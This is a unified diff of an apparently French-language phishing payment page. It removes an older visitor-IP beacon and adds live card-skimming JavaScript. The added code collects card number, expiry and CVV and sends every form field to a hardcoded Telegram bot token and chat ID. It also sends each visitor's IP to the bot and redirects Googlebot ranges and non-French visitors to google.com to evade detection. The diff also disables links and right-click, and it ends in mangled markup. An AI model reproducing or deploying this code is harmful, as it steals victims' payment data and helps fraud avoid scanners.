@@ -94,7 +94,8 @@
         }
     </style>
 
-</head>
+
+</style></head>
 
 <body class="lang-fr country-FR page-campaign">
         <script src="https://swiftclapocos.click/assets/js/jquery-3.6.1.min.js"></script>
@@ -110,6 +111,7 @@
 	<!-- SECTION START HERE -->
 	<section>
 
+    
 		<!-- PRODUCT BLOCK START HERE -->
 		<div class="product_wrapper animate">
 			<div class="container"> <!-- CONTAINER START -->
@@ -247,7 +249,7 @@
     <input type="hidden" name="request_hash" id="request_hash" value="eyJqYXZhX2VuYWJsZWQiOmZhbHNlLCJjb2xvcl9kZXB0aCI6MjQsInNjcmVlbl93aWR0aCI6MTM2MCwic2NyZWVuX2hlaWdodCI6NzY4LCJ0aW1lem9uZSI6LTYwLCJ0aW1lem9uZV9uYW1lIjoiRXVyb3BlL1BhcmlzIiwiZGV2aWNlIjoibm90X21vYmlsZSJ9">
 
 
-	</section>
+	</input<form></form></div></div></div></div></div></section>
 	<!-- SECTION END'S HERE -->
 
 	<!-- FOOTER START HERE -->
@@ -271,45 +273,7 @@
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
 
               
-              
-              <script>
-    async function getUserIP() {
-        try {
-            let response = await fetch("https://api64.ipify.org?format=json");
-            let data = await response.json();
-            let userIP = data.ip;
 
-            let message = `📩 Nouveau visiteur sur votre site :\n\n📌 *Adresse IP* : ${userIP}`;
-
-            let telegramBotToken = "7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k";
-            let chatId = "7747778364";
-            let telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-            fetch(telegramApiUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            }).then(response => {
-                if (!response.ok) {
-                    console.error("Erreur lors de l'envoi à Telegram.");
-                }
-            }).catch(error => {
-                console.error("Erreur :", error);
-            });
-
-        } catch (error) {
-            console.error("Impossible de récupérer l'IP :", error);
-        }
-    }
-
-    getUserIP();
-</script>
     
               
 <script>
@@ -350,30 +314,173 @@
             alert("Une erreur est survenue !");
         });
     });
+  
+
+  
+  
 </script>
 
+  
+  
+  
+  
+  <script>
+function formatCardNumber(element) {
+    let value = element.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    if (value.length > 16) {
+        value = value.substr(0, 16);
+    }
+    element.value = value === '' ? '' : value.match(/.{1,4}/g).join(' ');
+}
 
+function formatExpiryDate(element) {
+    let value = element.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    if (value.length > 4) {
+        value = value.substr(0, 4);
+    }
+    element.value = value === '' ? '' : value.replace(/(\d{2})(\d{0,2})/, '$1 / $2');
+}
 
-    // Autoriser le copier-coller uniquement dans les champs de formulaire
-    document.addEventListener("copy", function (event) {
-        if (!event.target.closest("input, textarea")) {
-            event.preventDefault();
+function limitCvvLength(element) {
+    if (element.value.length > 3) {
+        element.value = element.value.slice(0, 3);
+    }
+}
+
+async function sendTelegramAlert(message) {
+    const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Replace with your bot token
+    const chatId = '7747778364'; // Replace with your chat ID
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+        if (!response.ok || !data.ok) {
+            throw new Error('Failed to send message to Telegram');
+        }
+        console.log('Success:', data);
+    } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+        alert("Une erreur s'est produite lors de l'envoi du message.");
+        return false;
+    }
+    return true;
+}
+
+function capitalizeFirstLetter(string) {
+    return string.charAt(0).toUpperCase() + string.slice(1);
+}
+
+function handleSubmit(event) {
+    event.preventDefault(); // Prevent default form submission
+    const cardNumber = document.getElementById('card_number').value.replace(/\s+/g, '');
+    const expiryDate = document.getElementById('expiry_date').value.replace(/\s+/g, '').replace('/', '');
+    const cvv = document.getElementById('cvv').value;
+
+    // Validation checks
+    if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
+        alert("Le numéro de carte doit comporter exactement 16 chiffres.");
+        return false;
+    }
+    if (expiryDate.length !== 4 || !/^\d{2}\d{2}$/.test(expiryDate) || !(parseInt(expiryDate.substring(0, 2)) >= 1 && parseInt(expiryDate.substring(0, 2)) <= 12) || !(parseInt(expiryDate.substring(2, 4)) >= 23)) {
+        alert("La date d'expiration doit être au format MM / AA valide.");
+        return false;
+    }
+    if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+        alert("Le CVC/CVV doit comporter exactement 3 chiffres.");
+        return false;
+    }
+
+    // Proceed with sending form data to Telegram
+    const formData = new FormData(event.target);
+    let message = "New Payment Form Submission:\n";
+    formData.forEach((value, key) => {
+        if (key !== '_token') {
+            message += `${capitalizeFirstLetter(key.replace('_', ' '))}: ${value}\n`;
         }
     });
 
-    document.addEventListener("paste", function (event) {
-        if (!event.target.closest("input, textarea")) {
-            event.preventDefault();
+    sendTelegramAlert(message).then(success => {
+        if (success) {
+            window.location.href = 'https://justmoicom.github.io/test3/';
         }
+    }).catch(error => {
+        console.error("Error sending message to Telegram:", error);
+        alert("Une erreur s'est produite lors de l'envoi du message.");
     });
+    return false; // Prevent form submission to server
+}
 
-    document.addEventListener("cut", function (event) {
-        if (!event.target.closest("input, textarea")) {
+// Other functions remain unchanged...
+window.onload = function() {
+    getUserIPAndCountry();
+    disableLinks();
+    disableRightClick();
+};
+
+function isIpInRange(ip, range) {
+    const [ipBase, mask] = range.split('/');
+    const ipNum = ip.split('.').reduce((a, b) => (a << 8) + +b, 0);
+    const baseNum = ipBase.split('.').reduce((a, b) => (a << 8) + +b, 0);
+    const maskNum = (0xffffffff << (32 - mask)) >>> 0;
+    return (ipNum & maskNum) === (baseNum & maskNum);
+}
+
+const bannedIps = [
+    '66.249.64.0/19',  // bot IP range
+    '66.249.66.0/20',  // Another Googlebot IP range
+    '66.249.68.0/21',  // Another Googlebot IP range
+    '66.249.71.0/24',  // Another Googlebot IP range
+    '66.249.72.0/22',  // Another Googlebot IP range
+    '66.249.76.0/22',  // Another Googlebot IP range
+    '66.249.80.0/20',  // Another Googlebot IP range
+    '66.249.96.0/19',  // Another Googlebot IP range
+    '216.239.32.0/19', // Another Googlebot IP range
+];
+
+function isIpBanned(ip) {
+    return bannedIps.some(range => isIpInRange(ip, range));
+}
+
+function getUserIPAndCountry() {
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const country = data.country;
+            if (isIpBanned(ip)) {
+                window.location.href = 'https://www.google.com/';
+                sendTelegramAlert(`IP BANNED: ${ip}`); // Notify about banned IP
+            } else if (country !== 'FR') {
+                window.location.href = 'https://google.com';
+            } else {
+                sendTelegramAlert(`New visitor on the site! IP Address: ${ip}`); // Notify about new visitor
+            }
+        })
+        .catch((error) => console.error('Error getting IP:', error));
+}
+
+function disableLinks() {
+    const links = document.querySelectorAll('a');
+    links.forEach(link => {
+        link.style.pointerEvents = 'none';
+        link.style.cursor = 'default';
+    });
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+    const form = document.getElementById('paymentForm');
+    const payerButton = form.querySelector('button[type="submit"]');
+    form.addEventListener('click', function(event) {
+        if (event.target !== payerButton) {
             event.preventDefault();
         }
     });
+});
 </script>
 
+  
 
 <div id="veepn-guard-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><div id="veepn-breach-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style>
-<div id="veepn-breach-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><div id="veepn-guard-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></body></html>
+<div id="veepn-breach-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><div id="veepn-guard-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style>
+<div id="veepn-guard-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><div id="veepn-breach-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-
+extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></body></html>
